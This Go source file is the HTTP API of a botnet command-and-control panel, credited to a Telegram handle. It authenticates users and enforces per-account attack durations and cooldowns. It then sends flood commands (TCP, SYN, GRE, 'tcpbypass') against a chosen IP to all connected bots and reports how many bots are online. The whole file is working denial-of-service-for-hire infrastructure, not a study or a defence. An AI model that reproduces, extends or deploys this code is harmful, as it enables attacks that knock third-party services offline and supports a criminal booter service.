// by juan @anessdev on telegram
package main

import (
    "fmt"
    "net"
    "net/http"
    "strconv"
    "strings"
    "time"
    "encoding/base64"
)

var methodMap = map[string]string{
    "tcp":       "!tcp",
    "syn":       "!syn",
    "socket":    "!socket",
    "greip":     "!greip",
    "greeth":    "!greeth",
    "tcpbypass": "!tcpbypass",
}

var methodDefaults = map[string]string{
    "tcp": " dport=80",
    "syn": " dport=80",
}

func StartAPIServer(db *Database) {
    mux := http.NewServeMux()
    mux.HandleFunc("/api", apiHandler)
    mux.HandleFunc("/stats", statsHandler)
    mux.HandleFunc("/api/login", loginHandler)

    server := &http.Server{
        Addr:         "0.0.0.0:8098",
        Handler:      mux,
        ReadTimeout:  10 * time.Second,
        WriteTimeout: 10 * time.Second,
    }

    fmt.Println("[API] Listening on http://0.0.0.0:8098")
    if err := server.ListenAndServe(); err != nil {
        fmt.Printf("[API] Server error: %s\n", err)
    }
}

func authenticateRequest(r *http.Request) (*AccountInfo, string) {
    authHeader := r.Header.Get("Authorization")

    if strings.HasPrefix(authHeader, "Basic ") {
        payload, err := base64.StdEncoding.DecodeString(authHeader[6:])
        if err == nil {
            creds := strings.SplitN(string(payload), ":", 2)
            if len(creds) == 2 {
                ok, info := database.TryLogin(creds[0], creds[1])
                if ok {
                    return &info, ""
                }
                return nil, "Invalid username or password"
            }
        }
    }

    if strings.HasPrefix(authHeader, "Bearer ") {
        ok, info := database.CheckApiCode(authHeader[7:])
        if ok {
            return &info, ""
        }
        return nil, "Invalid API key"
    }

    apiKey := r.Header.Get("X-API-Key")
    if apiKey != "" {
        ok, info := database.CheckApiCode(apiKey)
        if ok {
            return &info, ""
        }
        return nil, "Invalid API key"
    }

    apiKey = r.URL.Query().Get("api_key")
    if apiKey != "" {
        ok, info := database.CheckApiCode(apiKey)
        if ok {
            return &info, ""
        }
        return nil, "Invalid API key"
    }

    return nil, "Authentication required"
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method != "GET" && r.Method != "POST" {
        http.Error(w, `{"status":"error","message":"Method not allowed"}`, 405)
        return
    }

    accInfo, errMsg := authenticateRequest(r)
    if accInfo == nil {
        w.Header().Set("Content-Type", "application/json")
        w.WriteHeader(401)
        fmt.Fprintf(w, `{"status":"error","message":"%s"}`, errMsg)
        return
    }

    w.Header().Set("Content-Type", "application/json")
    fmt.Fprintf(w, `{"status":"ok","username":"%s","max_bots":%d,"admin":%d,"max_duration":%d,"cooldown":%d}`,
        accInfo.username, accInfo.maxBots, accInfo.admin, accInfo.maxDuration, accInfo.cooldown)
}

func statsHandler(w http.ResponseWriter, r *http.Request) {
    accInfo, errMsg := authenticateRequest(r)
    if accInfo == nil {
        w.Header().Set("Content-Type", "application/json")
        w.WriteHeader(401)
        fmt.Fprintf(w, `{"status":"error","message":"%s"}`, errMsg)
        return
    }

    botCount := clientList.Count()
    dist := clientList.Distribution()

    w.Header().Set("Content-Type", "application/json")

    distJSON := "{"
    first := true
    for k, v := range dist {
        if !first {
            distJSON += ","
        }
        distJSON += fmt.Sprintf(`"%s":%d`, k, v)
        first = false
    }
    distJSON += "}"

    fmt.Fprintf(w, `{"status":"ok","bots":%d,"distribution":%s}`, botCount, distJSON)
}

func apiHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method != "GET" {
        http.Error(w, `{"status":"error","message":"Method not allowed"}`, 405)
        return
    }

    accInfo, errMsg := authenticateRequest(r)
    if accInfo == nil {
        w.Header().Set("Content-Type", "application/json")
        w.WriteHeader(401)
        fmt.Fprintf(w, `{"status":"error","message":"%s"}`, errMsg)
        return
    }

    query := r.URL.Query()
    target := query.Get("target")
    timeStr := query.Get("time")
    method := query.Get("method")
    port := query.Get("port")

    if target == "" || timeStr == "" || method == "" {
        w.Header().Set("Content-Type", "application/json")
        usage := `{"status":"error","message":"Missing parameters","usage":{`
        usage += `"target":"Target IP","time":"Duration in seconds","method":"Attack method",`
        usage += `"port":"Optional: target port","methods":[`
        first := true
        for k := range methodMap {
            if !first {
                usage += ","
            }
            usage += `"` + k + `"`
            first = false
        }
        usage += `]}}`
        w.WriteHeader(400)
        fmt.Fprintf(w, usage)
        return
    }

    if net.ParseIP(target) == nil {
        jsonError(w, `{"status":"error","message":"Invalid target IP address"}`)
        return
    }

    duration, err := strconv.Atoi(timeStr)
    if err != nil || duration < 1 || duration > 86400 {
        jsonError(w, `{"status":"error","message":"Invalid duration. Must be 1-86400 seconds"}`)
        return
    }

    if accInfo.maxDuration > 0 && duration > accInfo.maxDuration {
        jsonError(w, fmt.Sprintf(`{"status":"error","message":"Your max attack duration is %d seconds"}`, accInfo.maxDuration))
        return
    }

    method = strings.ToLower(method)
    cmdMethod, valid := methodMap[method]
    if !valid {
        methods := make([]string, 0, len(methodMap))
        for k := range methodMap {
            methods = append(methods, k)
        }
        jsonError(w, fmt.Sprintf(`{"status":"error","message":"Invalid method. Valid: %s"}`, strings.Join(methods, ", ")))
        return
    }

    botCount := int(clientList.Count())
    if botCount == 0 {
        jsonError(w, `{"status":"error","message":"No bots connected"}`)
        return
    }

    cmd := cmdMethod + " " + target + " " + timeStr

    if port != "" {
        if _, err := strconv.Atoi(port); err == nil {
            cmd += " dport=" + port
        }
    } else if defaultParams, ok := methodDefaults[method]; ok {
        cmd += defaultParams
    }

    canLaunch, launchErr := database.CanLaunchAttack(accInfo.username, uint32(duration), cmd, botCount, 1)
    if !canLaunch {
        w.Header().Set("Content-Type", "application/json")
        w.WriteHeader(429)
        fmt.Fprintf(w, `{"status":"error","message":"%s"}`, launchErr.Error())
        return
    }

    clientList.QueueBuf([]byte(cmd), -1, "")

    fmt.Printf("[API] %s >> %s (%s) [%d bots]\n",
        accInfo.username, cmd, r.RemoteAddr, botCount)

    w.Header().Set("Content-Type", "application/json")
    fmt.Fprintf(w, `{"status":"success","command":"%s","target":"%s","method":"%s","duration":%d,"bots":%d,"user":"%s"}`,
        cmd, target, method, duration, botCount, accInfo.username)
}

func jsonError(w http.ResponseWriter, msg string) {
    w.Header().Set("Content-Type", "application/json")
    w.WriteHeader(400)
    fmt.Fprintf(w, msg)
}
